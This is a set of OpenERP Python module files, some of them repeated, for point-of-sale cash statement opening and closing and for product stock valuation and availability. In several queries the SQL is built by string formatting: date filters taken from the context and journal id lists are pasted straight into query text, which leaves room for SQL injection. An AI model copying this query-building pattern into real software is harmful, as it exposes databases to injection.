             @return : Blank Dictionary
        """
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)
    #        if not list_statement:
    #            return {}
    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)
    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': "[('id','in'," + str(list_statement) + ")]",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for "%s". \n Please close the cashbox related to. ' %(journal.name)))
            
#            cr.execute(""" Select id from account_bank_statement
#                                    where journal_id =%d
#                                    and company_id =%d
#                                    order by id desc limit 1""" %(journal.id, company_id))
#            st_id = cr.fetchone()
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

    #            period = statement_obj._get_period(cr, uid, context) or None
    #            cr.execute("INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))
    #            cr.commit()
    #            cr.execute("select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'"%(journal.id, company_id, uid, number))
    #            statement_id = cr.fetchone()[0]
    #            print "statement_id",statement_id
    #            if st_id:
    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])
    #                list_statement.append(statemt_id.id)
    #                if statemt_id and statemt_id.ending_details_ids:
    #                    statement_obj.write(cr, uid, [statement_id], {
    #                        'balance_start': statemt_id.balance_end,
    #                        'state': 'open',
    #                    })
    #                    if statemt_id.ending_details_ids:
    #                        for i in statemt_id.ending_details_ids:
    #                            c = statement_obj.create(cr, uid, {
    #                                'pieces': i.pieces,
    #                                'number': i.number,
    #                                'starting_id': statement_id,
    #                            })
        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
#           'domain': "[('id','in', ["+','.join(map(str,list_statement))+"])]",
            'domain': "[('state','=','open')]",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Dictionary
        """
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        statement_obj = self.pool.get('account.bank.statement')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if not ids:
                raise osv.except_osv(_('Message'), _('Journals are already closed'))
            else:
                list_statement.append(ids[0])
                if not journal.check_dtls:
                    statement_obj.button_confirm_cash(cr, uid, ids, context)
    #        if not list_statement:
    #            return {}
    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)
    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']

        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id
        return {
                'domain': "[('id','in'," + str(list_statement) + ")]",
                'name': 'Close Statements',
                'view_type': 'form',
                'view_mode': 'tree,form',
                'res_model': 'account.bank.statement',
                'views': [(id2, 'tree'),(id3, 'form')],
                'type': 'ir.actions.act_window'}

pos_close_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _
import time

class pos_open_statement(osv.osv_memory):
    _name = 'pos.open.statement'
    _description = 'Open Statements'

    def open_statement(self, cr, uid, ids, context):
        """
             Open the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Directory
        """
        list_statement = []
        mod_obj = self.pool.get('ir.model.data')
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        statement_obj = self.pool.get('account.bank.statement')
        sequence_obj = self.pool.get('ir.sequence')
        journal_obj = self.pool.get('account.journal')
        cr.execute("""select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id"""%(uid))
        j_ids = map(lambda x1: x1[0], cr.fetchall())
        cr.execute(""" select id from account_journal                    
                            where auto_cash='True' and type='cash'                    
                            and id in (%s)""" %(','.join(map(lambda x: "'" + str(x) + "'", j_ids))))                    
        journal_ids = map(lambda x1: x1[0], cr.fetchall())                    

        for journal in journal_obj.browse(cr, uid, journal_ids):
            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])
            if len(ids):
                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for "%s". \n Please close the cashbox related to. ' %(journal.name)))
            
#            cr.execute(""" Select id from account_bank_statement
#                                    where journal_id =%d
#                                    and company_id =%d
#                                    order by id desc limit 1""" %(journal.id, company_id))
#            st_id = cr.fetchone()
            
            number = ''
            if journal.sequence_id:
                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)
            else:
                number = sequence_obj.get(cr, uid, 'account.bank.statement')
            
            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,
                                                          'company_id': company_id,
                                                          'user_id': uid,
                                                          'state': 'open',
                                                          'name': number,
                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),
                                                      })
            statement_obj.button_open(cr, uid, [statement_id], context)

    #            period = statement_obj._get_period(cr, uid, context) or None
    #            cr.execute("INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))
    #            cr.commit()
    #            cr.execute("select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'"%(journal.id, company_id, uid, number))
    #            statement_id = cr.fetchone()[0]
    #            print "statement_id",statement_id
    #            if st_id:
    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])
    #                list_statement.append(statemt_id.id)
    #                if statemt_id and statemt_id.ending_details_ids:
    #                    statement_obj.write(cr, uid, [statement_id], {
    #                        'balance_start': statemt_id.balance_end,
    #                        'state': 'open',
    #                    })
    #                    if statemt_id.ending_details_ids:
    #                        for i in statemt_id.ending_details_ids:
    #                            c = statement_obj.create(cr, uid, {
    #                                'pieces': i.pieces,
    #                                'number': i.number,
    #                                'starting_id': statement_id,
    #                            })
        data_obj = self.pool.get('ir.model.data')
        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')
        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')
        if id2:
            id2 = data_obj.browse(cr, uid, id2, context=context).res_id
        if id3:
            id3 = data_obj.browse(cr, uid, id3, context=context).res_id

        return {
#           'domain': "[('id','in', ["+','.join(map(str,list_statement))+"])]",
            'domain': "[('state','=','open')]",
            'name': 'Open Statement',
            'view_type': 'form',
            'view_mode': 'tree,form',
            'res_model': 'account.bank.statement',
            'views': [(id2, 'tree'),(id3, 'form')],
            'type': 'ir.actions.act_window'
}
pos_open_statement()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import fields, osv
from tools.translate import _

class product_product(osv.osv):
    _inherit = "product.product"

    def get_product_accounts(self, cr, uid, product_id, context=None):
        """ To get the stock input account, stock output account and stock journal related to product.
        @param product_id: product id
        @return: dictionary which contains information regarding stock input account, stock output account and stock journal
        """
        if context is None:
            context = {}
        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)

        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False
        if not stock_input_acc:
            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False

        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False
        if not stock_output_acc:
            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False

        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False
        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False

        return {
            'stock_account_input': stock_input_acc,
            'stock_account_output': stock_output_acc,
            'stock_journal': journal_id,
            'property_stock_variation': account_variation
        }

    def do_change_standard_price(self, cr, uid, ids, datas, context={}):
        """ Changes the Standard Price of Product and creates an account move accordingly.
        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal
        @param context: A standard dictionary
        @return:

        """
        location_obj = self.pool.get('stock.location')
        move_obj = self.pool.get('account.move')
        move_line_obj = self.pool.get('account.move.line')

        new_price = datas.get('new_price', 0.0)
        stock_output_acc = datas.get('stock_output_account', False)
        stock_input_acc = datas.get('stock_input_account', False)
        journal_id = datas.get('stock_journal', False)
        product_obj=self.browse(cr,uid,ids)[0]
        account_variation = product_obj.categ_id.property_stock_variation
        account_variation_id = account_variation and account_variation.id or False
        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))
        move_ids = []
        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])
        for rec_id in ids:
            for location in location_obj.browse(cr, uid, loc_ids):
                c = context.copy()
                c.update({
                    'location': location.id,
                    'compute_child': False
                })

                product = self.browse(cr, uid, rec_id, context=c)
                qty = product.qty_available
                diff = product.standard_price - new_price
                if not diff: raise osv.except_osv(_('Error!'), _("Could not find any difference between standard price and new price!"))
                if qty:
                    company_id = location.company_id and location.company_id.id or False
                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))
                    #
                    # Accounting Entries
                    #
                    if not journal_id:
                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False
                    if not journal_id:
                        raise osv.except_osv(_('Error!'),
                            _('There is no journal defined '\
                                'on the product category: "%s" (id: %d)') % \
                                (product.categ_id.name,
                                    product.categ_id.id,))
                    move_id = move_obj.create(cr, uid, {
                                'journal_id': journal_id,
                                'company_id': company_id
                                })

                    move_ids.append(move_id)


                    if diff > 0:
                        if not stock_input_acc:
                            stock_input_acc = product.product_tmpl_id.\
                                property_stock_account_input.id
                        if not stock_input_acc:
                            stock_input_acc = product.categ_id.\
                                    property_stock_account_input_categ.id
                        if not stock_input_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock input account defined ' \
                                            'for this product: "%s" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * diff
                        move_line_obj.create(cr, uid, {
                                    'name': product.name,
                                    'account_id': stock_input_acc,
                                    'debit': amount_diff,
                                    'move_id': move_id,
                                    })
                        move_line_obj.create(cr, uid, {
                                    'name': product.categ_id.name,
                                    'account_id': account_variation_id,
                                    'credit': amount_diff,
                                    'move_id': move_id
                                    })
                    elif diff < 0:
                        if not stock_output_acc:
                            stock_output_acc = product.product_tmpl_id.\
                                property_stock_account_output.id
                        if not stock_output_acc:
                            stock_output_acc = product.categ_id.\
                                    property_stock_account_output_categ.id
                        if not stock_output_acc:
                            raise osv.except_osv(_('Error!'),
                                    _('There is no stock output account defined ' \
                                            'for this product: "%s" (id: %d)') % \
                                            (product.name,
                                                product.id,))
                        amount_diff = qty * -diff
                        move_line_obj.create(cr, uid, {
                                        'name': product.name,
                                        'account_id': stock_output_acc,
                                        'credit': amount_diff,
                                        'move_id': move_id
                                    })
                        move_line_obj.create(cr, uid, {
                                        'name': product.categ_id.name,
                                        'account_id': account_variation_id,
                                        'debit': amount_diff,
                                        'move_id': move_id
                                    })

            self.write(cr, uid, rec_id, {'standard_price': new_price})

        return move_ids

    def view_header_get(self, cr, user, view_id, view_type, context=None):
        if context is None:
            context = {}
        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)
        if res: return res
        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):
            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name
        return res

    def get_product_available(self, cr, uid, ids, context=None):
        """ Finds whether product is available or not in particular warehouse.
        @return: Dictionary of values
        """
        if context is None:
            context = {}
        states = context.get('states',[])
        what = context.get('what',())
        if not ids:
            ids = self.search(cr, uid, [])
        res = {}.fromkeys(ids, 0.0)
        if not ids:
            return res

        if context.get('shop', False):
            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))
            res2 = cr.fetchone()
            if res2:
                context['warehouse'] = res2[0]

        if context.get('warehouse', False):
            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))
            res2 = cr.fetchone()
            if res2:
                context['location'] = res2[0]

        if context.get('location', False):
            if type(context['location']) == type(1):
                location_ids = [context['location']]
            elif type(context['location']) in (type(''), type(u'')):
                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)
            else:
                location_ids = context['location']
        else:
            location_ids = []
            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)
            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):
                location_ids.append(w.lot_stock_id.id)

        # build the list of ids of children of the location given by id
        if context.get('compute_child',True):
            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])
            location_ids = child_location_ids or location_ids
        else:
            location_ids = location_ids

        uoms_o = {}
        product2uom = {}
        for product in self.browse(cr, uid, ids, context=context):
            product2uom[product.id] = product.uom_id.id
            uoms_o[product.uom_id.id] = product.uom_id

        results = []
        results2 = []

        from_date=context.get('from_date',False)                    
        to_date=context.get('to_date',False)                    
        date_str=False                    
        if from_date and to_date:
            date_str="date_planned>='%s' and date_planned<='%s'"%(from_date,to_date)                    
        elif from_date:
            date_str="date_planned>='%s'"%(from_date)                    
        elif to_date:
            date_str="date_planned<='%s'"%(to_date)                    

        if 'in' in what:
            # all moves from a location out of the set to a location in the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id NOT IN %s'\
                'and location_dest_id IN %s'\
                'and product_id IN %s'\
                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\
                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)                    
            )
            results = cr.fetchall()
        if 'out' in what:
            # all moves from a location in the set to a location out of the set
            cr.execute(
                'select sum(product_qty), product_id, product_uom '\
                'from stock_move '\
                'where location_id IN %s'\
                'and location_dest_id NOT IN %s '\
                'and product_id  IN %s'\
                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\
                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)                    
            )
            results2 = cr.fetchall()
        uom_obj = self.pool.get('product.uom')
        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)
        if context.get('uom', False):
            uoms += [context['uom']]

        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)
        if uoms:
            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)
        for o in uoms:
            uoms_o[o.id] = o
        for amount, prod_id, prod_uom in results:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] += amount
        for amount, prod_id, prod_uom in results2:
            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,
                    uoms_o[context.get('uom', False) or product2uom[prod_id]])
            res[prod_id] -= amount
        return res

    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):
        """ Finds the incoming and outgoing quantity of product.
        @return: Dictionary of values
        """
        if not field_names:
            field_names = []
        if context is None:
            context = {}
        res = {}
        for id in ids:
            res[id] = {}.fromkeys(field_names, 0.0)
        for f in field_names:
            c = context.copy()
            if f == 'qty_available':
                c.update({ 'states': ('done',), 'what': ('in', 'out') })
            if f == 'virtual_available':
                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })
            if f == 'incoming_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })
            if f == 'outgoing_qty':
                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })
            stock = self.get_product_available(cr, uid, ids, context=c)
            for id in ids:
                res[id][f] = stock.get(id, 0.0)
        return res

    _columns = {
        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help="Current quantities of products in selected locations or all internal if none have been selected.", multi='qty_available'),
        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help="Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming.", multi='qty_available'),
        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help="Quantities of products that are planned to arrive in selected locations or all internal if none have been selected.", multi='qty_available'),
        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help="Quantities of products that are planned to leave in selected locations or all internal if none have been selected.", multi='qty_available'),
        'track_production': fields.boolean('Track Manufacturing Lots' , help="Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order"),
        'track_incoming': fields.boolean('Track Incoming Lots', help="Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location"),
        'track_outgoing': fields.boolean('Track Outgoing Lots', help="Forces to specify a Production Lot for all moves containing this product and going to a Customer Location"),
        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),
        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),
                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', 
                                        help="If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves." \
                                             "The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products."
                                        , required=True),
    }

    _defaults = {
        'valuation': lambda *a: 'manual_periodic',
    }

    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):
        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)
        if context is None:
            context = {}
        if ('location' in context) and context['location']:
            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])
            fields=res.get('fields',{})
            if fields:
                if location_info.usage == 'supplier':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Receptions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Received Qty')

                if location_info.usage == 'internal':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Stock')

                if location_info.usage == 'customer':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Deliveries')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Delivered Qty')

                if location_info.usage == 'inventory':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future P&L')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('P&L Qty')

                if location_info.usage == 'procurement':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Qty')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Unplanned Qty')

                if location_info.usage == 'production':
                    if fields.get('virtual_available'):
                        res['fields']['virtual_available']['string'] = _('Future Productions')
                    if fields.get('qty_available'):
                        res['fields']['qty_available']['string'] = _('Produced Qty')
        return res

product_product()

class product_template(osv.osv):
    _name = 'product.template'
    _inherit = 'product.template'
    _columns = {
        'property_stock_procurement': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Procurement Location",
            method=True,
            view_load=True,
            domain=[('usage','like','procurement')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements"),
        'property_stock_production': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Production Location",
            method=True,
            view_load=True,
            domain=[('usage','like','production')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders"),
        'property_stock_inventory': fields.property(
            'stock.location',
            type='many2one',
            relation='stock.location',
            string="Inventory Location",
            method=True,
            view_load=True,
            domain=[('usage','like','inventory')],
            help="For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory"),
        'property_stock_account_input': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
        'property_stock_account_output': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),
    }

product_template()

class product_category(osv.osv):

    _inherit = 'product.category'
    _columns = {
        'property_stock_journal': fields.property('account.journal',
            relation='account.journal', type='many2one',
            string='Stock journal', method=True, view_load=True,
            help="When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed."),
        'property_stock_account_input_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Input Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_account_output_categ': fields.property('account.account',
            type='many2one', relation='account.account',
            string='Stock Output Account', method=True, view_load=True,
            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),
        'property_stock_variation': fields.property('account.account',
            type='many2one',
            relation='account.account',
            string="Stock Variation Account",
            method=True, view_load=True,
            help="When real-time inventory valuation is enabled on a product, this account will hold the current value of the products.",),
    }

product_category()

# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:

# -*- coding: utf-8 -*-
##############################################################################
#
#    OpenERP, Open Source Management Solution
#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#
#    You should have received a copy of the GNU Affero General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
##############################################################################

from osv import osv
from tools.translate import _

class pos_close_statement(osv.osv_memory):
    _name = 'pos.close.statement'
    _description = 'Close Statements'

    def close_statement(self, cr, uid, ids, context):
        """
             Close the statements
             @param self: The object pointer.
             @param cr: A database cursor
             @param uid: ID of the user currently logged in
             @param context: A standard dictionary
             @return : Blank Dictionary
        """
        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id
        list_statement = []
